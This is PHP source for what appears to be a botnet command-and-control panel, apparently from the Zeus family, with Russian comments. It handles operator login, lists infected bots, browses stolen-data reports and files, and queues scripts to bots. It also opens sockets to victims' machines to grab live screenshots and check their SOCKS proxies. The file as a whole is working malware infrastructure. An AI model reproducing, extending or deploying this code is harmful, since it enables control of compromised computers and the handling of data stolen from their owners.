<?php define('__CP__', 1);

require_once('system/global.php');
if(!@include_once('system/config.php'))die('Hello! How are you?');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

define('CURRENT_TIME',     time());                                     //Текущее время.
define('ONLINE_TIME_MIN',  (CURRENT_TIME - $config['botnet_timeout'])); //Минимальное время для статуса "Онлайн".
define('DEFAULT_LANGUAGE', 'en');                                       //Язык по умолчанию.
define('THEME_PATH',       'theme');                                    //Папка для темы.

//HTTP запросы.
define('QUERY_SCRIPT',            basename($_SERVER['PHP_SELF']));
define('QUERY_SCRIPT_HTML',       QUERY_SCRIPT);
define('QUERY_VAR_MODULE',        'm');                     //Переменая указывающая на текущий модуль.
define('QUERY_STRING_BLANK',      QUERY_SCRIPT.'?m=');      //Пустая строка запроса.
define('QUERY_STRING_BLANK_HTML', QUERY_SCRIPT_HTML.'?m='); //Пустая строка запроса в HTML.
define('CP_HTTP_ROOT',            str_replace('\\', '/', (!empty($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : '/'))); //Корень CP.

//Сессия, куки.
define('COOKIE_USER',      'p');                    //Имя пользователя в куках.
define('COOKIE_PASS',      'u');                    //Пароль пользователя в куках.
define('COOKIE_LIVETIME',  CURRENT_TIME + 2592000); //Время жизни куков.
define('COOKIE_SESSION',   'ref');                  //Переменная для хранения сессии.
define('SESSION_LIVETIME', CURRENT_TIME + 1300);    //Время жизни сессии.

$_sessionRef = 0;

///////////////////////////////////////////////////////////////////////////////////////////////////
// Инициализация.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Подключаемся к базе.
if(!connectToDb())die(mysqlErrorEx());

//Подключаем тему.
require_once(THEME_PATH.'/index.php');

//Управление логином.
if(!empty($_GET[QUERY_VAR_MODULE]))
{
  //Форма логина.
  if(strcmp($_GET[QUERY_VAR_MODULE], 'login') === 0)
  {
    unlockSessionAndDestroyAllCokies();
    
    if(isset($_POST['user']) && isset($_POST['pass']))
    {
      $user = $_POST['user'];
      $pass = md5($_POST['pass']);
    
      //Проверяем логин.
      if(mysqlQueryEx('cp_users', "SELECT `id` FROM `cp_users` WHERE `name`='".addslashes($user)."' AND `pass`='".addslashes($pass)."' AND `flag_enabled`=1 LIMIT 1") && @mysql_affected_rows() == 1)
      {
        if(isset($_POST['remember']) && $_POST['remember'] == 1)
        {
          setcookie(COOKIE_USER, md5($user), COOKIE_LIVETIME, CP_HTTP_ROOT);
          setcookie(COOKIE_PASS, $pass,      COOKIE_LIVETIME, CP_HTTP_ROOT);
        }
    
        lockSession();
        $_SESSION['name'] = $user;
        $_SESSION['pass'] = $pass;
        //unlockSession();
      
        header('Location: '.QUERY_STRING_BLANK.'home');
      }
      else
      {
        sleep(5); //Антибрут.
        showLoginForm(true);
      }
      die();
    }
    
    showLoginForm(false);
    die();
  }
  
  //Выход
  if(strcmp($_GET['m'], 'logout') === 0)
  {
    unlockSessionAndDestroyAllCokies();
    header('Location: '.QUERY_STRING_BLANK.'login');
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Проверка данных логина.
///////////////////////////////////////////////////////////////////////////////////////////////////

$logined = 0; //Флаг означающий, залогинины ли мы.

//Логин через сессию.
lockSession();
if(!empty($_SESSION['name']) && !empty($_SESSION['pass']))
{
  if(($r = mysqlQueryEx('cp_users', "SELECT * FROM `cp_users` WHERE `name`='".addslashes($_SESSION['name'])."' AND `pass`='".addslashes($_SESSION['pass'])."' AND `flag_enabled`=1 LIMIT 1")))$logined = @mysql_affected_rows();
}
//Логин через куки.
if($logined !== 1 && !empty($_COOKIE[COOKIE_USER]) && !empty($_COOKIE[COOKIE_PASS]))
{
  if(($r = mysqlQueryEx('cp_users', "SELECT * FROM `cp_users` WHERE MD5(`name`)='".addslashes($_COOKIE[COOKIE_USER])."' AND `pass`='".addslashes($_COOKIE[COOKIE_PASS])."' AND `flag_enabled`=1 LIMIT 1")))$logined = @mysql_affected_rows();
}
//Не удалось залогиниться.
if($logined !== 1)
{
  unlockSessionAndDestroyAllCokies();
  sleep(5); //Антибрут.
  header('Location: '.QUERY_STRING_BLANK.'login');
  die();
}

//Получаем данные пользователя.
$userData = @mysql_fetch_assoc($r);
if($userData === false)die(mysqlErrorEx());
$_SESSION['name'] = $userData['name'];
$_SESSION['pass'] = $userData['pass'];

//Подключаем язык.
if(@strlen($userData['language']) != 2 || !safePath($userData['language']) || !file_exists('system/lng.'.$userData['language'].'.php'))$userData['language'] = DEFAULT_LANGUAGE;
require_once('system/lng.'.$userData['language'].'.php'); 

unlockSession();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Определяем меню.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Главное меню.
$mainMenu = array(      //Модуль.             //Название.               //Необходимые права.
                  array(0,                    LNG_MM_STATS,             array()),
                  array('stats_main',         LNG_MM_STATS_MAIN,        array('r_stats_main')),
                  array('stats_os',           LNG_MM_STATS_OS,          array('r_stats_os')),

                  array(0,                    LNG_MM_BOTNET,            array()),
                  array('botnet_bots',        LNG_MM_BOTNET_BOTS,       array('r_botnet_bots')),
                  array('botnet_scripts',     LNG_MM_BOTNET_SCRIPTS,    array('r_botnet_scripts')),
                   
                  array(0,                    LNG_MM_REPORTS,           array()),
                  array('reports_db',         LNG_MM_REPORTS_DB,        array('r_reports_db')),
                  array('reports_files',      LNG_MM_REPORTS_FILES,     array('r_reports_files')),
                  array('reports_jn',         LNG_MM_REPORTS_JN,       array('r_reports_jn')),

                  array(0,                    LNG_MM_SYSTEM,            array()),
                  array('sys_info',           LNG_MM_SYSTEM_INFO,       array('r_system_info')),
                  array('sys_options',        LNG_MM_SYSTEM_OPTIONS,    array('r_system_options')),
                  array('sys_user',           LNG_MM_SYSTEM_USER,       array('r_system_user')),
                  array('sys_users',          LNG_MM_SYSTEM_USERS,      array('r_system_users'))
                 );

//Меню дейтвий над ботом. Также применяется для массива ботов.
$botMenu = array(
                 array('fullinfo',        LNG_MBA_FULLINFO,         array('r_botnet_bots')),
                 array('fullinfoss',      LNG_MBA_FULLINFOSS,       array('r_botnet_bots')),
                   
                 array(0,                 LNG_MBA_SEPARATOR,        array()),
                 array('today_dbreports', LNG_MBA_TODAY_DBREPORTS,  array('r_reports_db')),
                 array('week_dbreports',  LNG_MBA_WEEK_DBREPORTS,   array('r_reports_db')),
                 array('files',           LNG_MBA_FILES,            array('r_reports_files')),
                   
                 array(0,                 LNG_MBA_SEPARATOR,        array()),
                 array('remove',          LNG_MBA_REMOVE,           array('r_edit_bots')),
                 array('removeex',        LNG_MBA_REMOVE_REPORTS,   array('r_edit_bots', 'r_reports_db_edit', 'r_reports_files_edit')),
                   
                 array(0,                 LNG_MBA_SEPARATOR,        array()),
                 array('port_socks',      LNG_MBA_PORT_SOCKS,       array('r_botnet_bots')),
                 array('newscript',       LNG_MBA_NEWSCRIPT,        array('r_botnet_scripts_edit'))
                );

optimizeMenu($botMenu, false);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обработка группы ботов.
///////////////////////////////////////////////////////////////////////////////////////////////////

if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_POST['bots']) && is_array($_POST['bots'])) || (!empty($_GET['bots']) && is_array($_GET['bots']))))
{
  $bedit = empty($userData['r_edit_bots']) ? 0 : 1;
  $ba    = !empty($_GET['botsaction']) ? $_GET['botsaction'] : $_POST['botsaction'];
  $blist = !empty($_POST['bots']) && is_array($_POST['bots']) ? $_POST['bots'] : $_GET['bots'];
  $blist = array_unique($blist);
  
  //Проверям есть ли право на действие.
  $deny = true;
  foreach($botMenu as $item)if($item[0] !== 0 && strcmp($item[0], $ba) === 0){$deny = false; break;}
  if($deny)ThemeFatalError(LNG_ACCESS_DEFINED);
  
  //Составляем список ботов для MySQL.
  $sqlBlist = '';
  $count = 0;
  foreach($blist as $bot)$sqlBlist .= ($count++ == 0 ? '' : ' OR ')."`bot_id`='".addslashes($bot)."'";

  if(strcmp($ba, 'fullinfo') === 0 || strcmp($ba, 'fullinfoss') === 0)
  {
    //Режим обнавления.
    if($bedit && isset($_GET['save']) && (isset($_POST['used']) && is_array($_POST['used'])) && (isset($_POST['comment']) && is_array($_POST['comment'])))
    {
      $q = '';
      foreach($blist as $i => $bot)if(isset($_POST['used'][$i]) && isset($_POST['comment'][$i]))
      {
        mysqlQueryEx('botnet_list', "UPDATE `botnet_list` SET `flag_used`='".($_POST['used'][$i] == 1 ? 1 : 0)."', `comment`='".addslashes(substr($_POST['comment'][$i], 0, 250))."' WHERE `bot_id`='".addslashes($bot)."' LIMIT 1");
        $q .= '&bots[]='.urlencode($bot);
      }
    
      header('Location: '.QUERY_SCRIPT.'?botsaction='.urlencode($ba).$q);
      die();
    }
    
    //Скриншот.
    if(strcmp($ba, 'fullinfoss') === 0 && isset($_GET['ipv4']) && isset($_GET['port']))
    {
      $format = 'image/'.$userData['ss_format'];
      $readed = 0;
      
      if(($sock = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 10)) !== false)
      {
        @stream_set_timeout($sock, 10);
        @fwrite($sock, pack('CCC', 0, $userData['ss_quality'] & 0xFF, strlen($format) & 0xFF).$format);
        @fflush($sock);
        if(($dataSize = @fread($sock, 4)) !== false && ($dataSize = unpack('L', $dataSize)))
        {
          $dataSize = $dataSize[1];
          while($readed < $dataSize && ($block = @fread($sock, $dataSize - $readed)) !== false)
          {
            if($readed === 0)header('Content-Type: '.$format);
            $readed += strlen($block);
            echo $block;
          }
        }
        @fclose($sock);
      }
      
      if($readed === 0)
      {
        header('Content-Type: image/png');
        echo file_get_contents(THEME_PATH.'/failed.png');
      }
      die();
    }
    
    //Стандартный вывод.
    if(!($r = mysqlQueryEx('botnet_list', 'SELECT *, IF(`rtime_last`>='.ONLINE_TIME_MIN.', 1, 0) AS `is_online`, LOCATE(`ipv4`, `ipv4_list`) as `nat_status` FROM `botnet_list` WHERE '.$sqlBlist)))ThemeMySQLError();
    
    //Получаем результат.
    $res = array();
    while(($m = @mysql_fetch_assoc($r)))$res[$m['bot_id']] = $m;
    mysql_free_result($r);
    unset($m);
    
    //Выводим результат.
    $eCount = 0;
    $data = '';
    if($bedit)$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('edit', QUERY_SCRIPT_HTML.'?botsaction='.$ba.'&amp;save=1', ''), THEME_FORMPOST_BEGIN);
    $data .=
    str_replace('{WIDTH}', '90%', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_BA_FULLINFO_TITLE), THEME_DIALOG_TITLE).
     THEME_DIALOG_ROW_BEGIN.
       str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN);
    
    foreach($blist as $bot)
    {
      $data .=
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_BOTID),         THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($bot, 'botmenu')), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END;
      
      //Базовая информация.
      $isExists = isset($res[$bot]);
      if(!$isExists)$data .= THEME_LIST_ROW_BEGIN.str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_FULLINFO_EMPTY), THEME_LIST_ITEM_EMPTY_1).THEME_LIST_ROW_END;
      else
      {
        $l = $res[$bot];
        $eCount++;

        $ipv4 = binaryIpToString($l['ipv4']);
        if($l['nat_status'] == 0)$ipv4 .= '*';

        $data .= 
        THEME_LIST_ROW_BEGIN.          
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_BOTNET),                                                                        THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['botnet'])),                                                                 THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_VERSION),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($l['bot_version'])),                                                               THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_OS),                                                                            THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', osDataToString($l['os_version'])),                                                              THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_OSLANG),                                                                        THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['language_id'])),                                                            THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TIMEBIAS),                                                                      THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', timeBiasToText($l['time_localbias'])),                                                          THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_COUNTRY),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['country'])),                                                                THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.         
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_IPV4),                                                                          THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ipv4),                                                                                         THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_LATENCY),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsFloat($l['net_latency'] / 1000, 3)),                                           THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TCPPORT_S1),                                                                    THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['tcpport_s1'])),                                                             THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TFIRST),                                                                        THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $l['rtime_first']))),                                     THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TLAST),                                                                         THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $l['rtime_last']))),                                      THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TONLINE),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['is_online'] == 1 ? tickCountToText(CURRENT_TIME - $l['rtime_online']) : LNG_FORMAT_NOTIME), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_NEW),                                                                           THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_new'] == 1 ? LNG_YES : LNG_NO),                                                        THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_USED),                                                                          THEME_LIST_ITEM_LTEXT_U1).
          ($bedit
          ?
            str_replace(array('{NAME}', '{WIDTH}'), array('used[]', 'auto'),                                                                                    THEME_LIST_ITEM_LISTBOX_U1_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_NO),  $l['flag_used'] != 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_YES), $l['flag_used'] == 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM).
            (                                                                                                                                                   THEME_LIST_ITEM_LISTBOX_U1_END)
          :
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_used'] == 1 ? LNG_YES : LNG_NO),                                                     THEME_LIST_ITEM_LTEXT_U1)
          ).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_COMMENT),                                                                      THEME_LIST_ITEM_LTEXT_U2).
          ($bedit
          ?
            str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('comment[]', htmlEntitiesEx($l['comment']), 250, '99%'),                    THEME_LIST_ITEM_INPUT_TEXT_U2)
          :
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($l['comment']) ? '-' : htmlEntitiesEx($l['comment'])),                               THEME_LIST_ITEM_LTEXT_U2)
          ).
        THEME_LIST_ROW_END;
        
        if(strcmp($ba, 'fullinfoss') === 0)
        {
          $ss = str_replace('{URL}', 
                            htmlEntitiesEx(QUERY_SCRIPT.'?botsaction=fullinfoss&bots[]=0&ipv4='.urlencode($ipv4).'&port='.urlencode($l['tcpport_s1'])),
                            THEME_SCREENSHOT);

          $data .= 
          THEME_LIST_ROW_BEGIN.
            str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_SCREENSHOT),                                                                  THEME_LIST_ITEM_LTEXT_U1).
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ss),                                                                                         THEME_LIST_ITEM_LTEXT_U1).
          THEME_LIST_ROW_END;
        }
      }
      
      //Концовка.
      $data .= 
      THEME_LIST_END.
      ($bedit && $isExists ? str_replace(array('{NAME}', '{VALUE}'), array('bots[]', htmlEntitiesEx($bot)), THEME_FORM_VALUE) : '').
      THEME_VSPACE;
    }
    
    $data .=
    THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;

    if($bedit && $eCount > 0)
    {
      $data .=
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BA_FULLINFO_ACTION_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      THEME_DIALOG_ACTIONLIST_END;
    }
    
    $data .=
    THEME_DIALOG_END.
    ($bedit ? THEME_FORMPOST_END : '');
    
    themeSmall(LNG_BA_FULLINFO_TITLE, $data, 0, getBotJsMenu('botmenu'), 0);
  }
  else if(strcmp($ba, 'today_dbreports') === 0 || strcmp($ba, 'week_dbreports') === 0)
  {
    $date2 = gmdate('ymd', CURRENT_TIME);    
    $date1 = strcmp($ba, 'week_dbreports') === 0 ? gmdate('ymd', CURRENT_TIME - 518400) : $date2;
    
    foreach($blist as $k => $v)if(spaceCharsExist($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'reports_db&date1='.urlencode($date1).'&date2='.urlencode($date2).'&bots='.urlencode(implode(' ', $blist)).'&q=');
    die();
  }
  else if(strcmp($ba, 'files') === 0)
  {
    foreach($blist as $k => $v)if(spaceCharsExist($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'reports_files&bots='.urlencode(implode(' ', $blist)).'&q=');
    die();
  }
  else if(strcmp($ba, 'remove') === 0 || strcmp($ba, 'removeex') === 0) //Проверка прав не требуется, т.к. проверка присходит при формировании $botMenu.
  {
    if(isset($_GET['yes']) || isset($_GET['no']))
    {
      $data =
      str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_REMOVE_TITLE), THEME_LIST_TITLE);
      
      if(isset($_GET['yes']))
      {
        //Удаление из botnet_list.
        if(mysqlQueryEx('botnet_list', 'DELETE FROM `botnet_list` WHERE '.$sqlBlist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
        else                                                                         $t = str_replace('{TEXT}', mysqlErrorEx(),                                       THEME_STRING_ERROR);
        
        $data .=
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', 'botnet_list'), THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END;
        
        //Удаление.
        if(strcmp($ba, 'removeex') === 0)
        {
          $i = 1;
          $rlist = listReportTables($config['mysql_db']);
          
          //Удаление из botnet_reports_*.
          foreach($rlist as $table)
          {
            if(mysqlQueryEx($table, "DELETE FROM `{$table}` WHERE ".$sqlBlist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
            else                                                                $t = str_replace('{TEXT}', mysqlErrorEx(),                                       THEME_STRING_ERROR);
            
            $item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);

            $data .=
            THEME_LIST_ROW_BEGIN.
              str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($table)), $item).
              str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item).
            THEME_LIST_ROW_END;
            
            $i++;
          }
          
          //Удаление файлов.
          $root = getDirs($config['reports_path']);
          if($root !== false)foreach($root as $rdir)
          {
            $rdir = $config['reports_path'].'/'.$rdir;
            $botnets = getDirs($rdir);
            
            if($botnets !== false)foreach($botnets as $botnet)
            {
              $botnet = $rdir.'/'.$botnet;
              $bots = getDirs($botnet);

              if($bots !== false)foreach($bots as $bot)
              {
                $botLower = mb_strtolower(urldecode($bot));
                $bot = $botnet.'/'.$bot;
                
                foreach($blist as $l)
                {
                  if(strcmp($botLower, mb_strtolower($l)) === 0)
                  {
                    if(clearPath($bot))$t = str_replace('{TEXT}', LNG_BA_REMOVE_FREMOVED, THEME_STRING_SUCCESS);
                    else               $t = str_replace('{TEXT}', LNG_BA_REMOVE_FERROR,   THEME_STRING_ERROR);
                    
                    $item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);

                    $data .=
                    THEME_LIST_ROW_BEGIN.
                      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($bot)), $item).
                      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item).
                    THEME_LIST_ROW_END;
            
                    $i++;
                  }
                }
              }
              unset($bots);
            }
            unset($botnets);
          }
          unset($root);
        }
      }
      else $data .= THEME_LIST_ROW_BEGIN.str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_BA_REMOVE_ABORTED), THEME_LIST_ITEM_LTEXT_U1).THEME_LIST_ROW_END;
      
      themeSmall(LNG_BA_REMOVE_TITLE, $data.THEME_LIST_END, 0, 0, 0); 
    }
    else
    {
      $bl = '';
      foreach($blist as $bot)$bl .= '&bots[]='.addJsSlashes(urlencode($bot));
      
      $q = sprintf(strcmp($ba, 'remove') === 0 ? LNG_BA_REMOVE_Q1 : LNG_BA_REMOVE_Q2, count($blist));
      $js = "function qr(){var r = confirm('".addJsSlashes($q)."') ? 'yes': 'no'; window.location='".addJsSlashes(QUERY_SCRIPT)."?botsaction={$ba}{$bl}&' + r;}";
      themeSmall(LNG_BA_REMOVE_TITLE, '', $js, 0, ' onload="qr()"'); 
    }
  }
  else if(strcmp($ba, 'port_socks') === 0)
  {
    //Проверка сокса.
    if(isset($_GET['ipv4']) && isset($_GET['port']))
    {
      $ok = 0;
      if(($s = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
      {
        @stream_set_timeout($s, 5);
        $data = pack('CCSL', 4, 1, 0, 0)."\0"; //Заголовок Socks4.
        if(@fwrite($s, $data) && ($data = @fread($s, 8)) && strlen($data) == 8)$ok = 1;
        fclose($s);
      }
      
      if($ok == 1)echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_SUCCESS, THEME_STRING_SUCCESS);
      else        echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_FAILED,  THEME_STRING_ERROR);
      
      die();
    }
    
    //Вывод списка.
    if(!($r = mysqlQueryEx('botnet_list', 'SELECT `bot_id`, `country`, `ipv4`, `tcpport_s1` FROM `botnet_list` WHERE '.$sqlBlist)))ThemeMySQLError();
    
    //Получаем результат.
    $res = array();
    while(($m = @mysql_fetch_row($r)))$res[$m[0]] = $m;
    mysql_free_result($r);
    unset($m);
    
    $data =
    str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(3, LNG_BA_PORT_SOCKS_TITLE), THEME_LIST_TITLE);
        
    $i = 0;
    $jsList = '';
    
    //Выводим результат.
    foreach($blist as $bot)
    {
      $isExists = isset($res[$bot]);
      $item = ((($i++) % 2 == 0) ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2);
      if($isExists)
      {
        $l    = $res[$bot];
        $ipv4 = binaryIpToString($l[2]);
        $jsList .= ($jsList == '' ? '' : ', ')."['st{$i}', '".addJsSlashes(urlencode($ipv4))."', '".addJsSlashes(urlencode($l[3]))."']";
      }
      
      $data .=
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($bot, 'botmenu').THEME_STRING_SPACE.'/'.THEME_STRING_SPACE.($isExists ? $l[1] : '--')), $item).
        str_replace(array('{WIDTH}', '{TEXT}'), array('150px', $isExists ? htmlEntitiesEx($ipv4.':'.$l[3]) : '-:-'), $item).
        str_replace(array('{WIDTH}', '{TEXT}'), array('150px',
                                                      $isExists ? 
                                                      str_replace('{ID}', 'st'.$i, THEME_STRING_ID_BEGIN).LNG_BA_PORT_SOCKS_CHECKING.THEME_STRING_ID_END :
                                                      LNG_BA_PORT_SOCKS_FAILED
                                                     ), $item).
      THEME_LIST_ROW_END;
    }
    
    //Скрипт для проверки соксов.
    $ajaxError = addJsSlashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
    $ajaxInit  = jsXmlHttpRequest('socksHttp');
    $q         = addJsSlashes(QUERY_SCRIPT.'?botsaction=port_socks&bots[]=0');
    $ajax      =
<<<JS_SCRIPT
var socksList = [{$jsList}];
var socksHttp = false;

function stateChange(i){if(socksHttp.readyState == 4)
{
  var el = document.getElementById(socksList[i][0]);
  if(socksHttp.status == 200 && socksHttp.responseText.length > 5)el.innerHTML = socksHttp.responseText;
  else el.innerHTML = '{$ajaxError}';
  SocksCheck(++i);
}}

function SocksCheck(i)
{
  if(socksHttp)delete socksHttp;
  if(i < socksList.length)
  {
    {$ajaxInit}
    if(socksHttp)
    {
      socksHttp.onreadystatechange = function(){stateChange(i)};
      socksHttp.open('GET', '{$q}&ipv4=' + socksList[i][1] + '&port=' + socksList[i][2], true);
      socksHttp.send(null);
    }
  }
}
JS_SCRIPT;
    
    themeSmall(LNG_BA_PORT_SOCKS_TITLE, $data.THEME_LIST_END, $ajax, getBotJsMenu('botmenu'), ' onload="SocksCheck(0);"');
  }
  else if(strcmp($ba, 'newscript') === 0)
  {
    foreach($blist as $k => $v)if(spaceCharsExist($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'botnet_scripts&new=-1&bots='.urlencode(implode(' ', $blist)));
    die();
  }
  
  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Запуск модуля.
///////////////////////////////////////////////////////////////////////////////////////////////////
                            
//Выбор имени модуля и удаление лишних пунктов меню.
$neededModule = (empty($_GET[QUERY_VAR_MODULE]) ? '' : $_GET[QUERY_VAR_MODULE]);
$curModule     =  '';

optimizeMenu($mainMenu, true);
foreach($mainMenu as $key => $item)if($item[0] !== 0 && (strcmp($neededModule, $item[0]) === 0 || $curModule == ''))$curModule = $item[0];
if($curModule == '')die('Modules for current user not defined.');

define('CURRENT_MODULE',      $curModule);                             //Текущий модуль.
